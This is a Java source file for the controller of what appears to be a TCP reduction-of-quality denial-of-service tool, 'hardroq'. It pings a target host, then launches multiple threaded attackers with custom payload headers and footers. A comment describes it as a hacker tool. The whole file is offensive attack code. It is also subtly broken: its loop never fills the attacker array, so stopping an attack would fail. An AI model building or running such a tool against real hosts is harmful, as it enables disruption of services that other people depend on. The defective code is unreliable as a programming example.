package hardroq.controllers;

import java.io.IOException;

import hardroq.networking.Ping;
import hardroq.networking.TCPRoQ;

public class AttackController {
	//Singleton Crap
	private static AttackController _instance = new AttackController();
	private AttackController() {}
	
	public static AttackController getInstance() {
		return _instance;
	}
	
	//Internals
	private TCPRoQ[] attackers;
	private String host;
	private int port;
	private int RTT;
	private int burstcount;
	private int datasize;
	private String attackHeader = "";
	private String attackFooter = "";
	
	public void Attack(int numThreads) {
		//First, let's get a round trip time to initiate our attack vectors
		try {
			RTT = Ping.HTTPPing(host, port);
		} catch (IOException e) {
			//This is a hacker tool, who fucking cares?
		}
		
		attackers = new TCPRoQ[numThreads];
		for (TCPRoQ a : attackers) {
			a = new TCPRoQ.Builder().host(host).port(port)
					.datasize(datasize).header(attackHeader)
					.footer(attackFooter).build();
			a.InitiateAttack();
		}
	}
	
	public void EndAttack() {
		for (TCPRoQ a : attackers)
			a.EndAttack();
	}
	
	public void setAttackHeader(String h) {
		attackHeader = h;
	}
	
	public void setAttackFooter(String f) {
		attackFooter = f;
	}
}
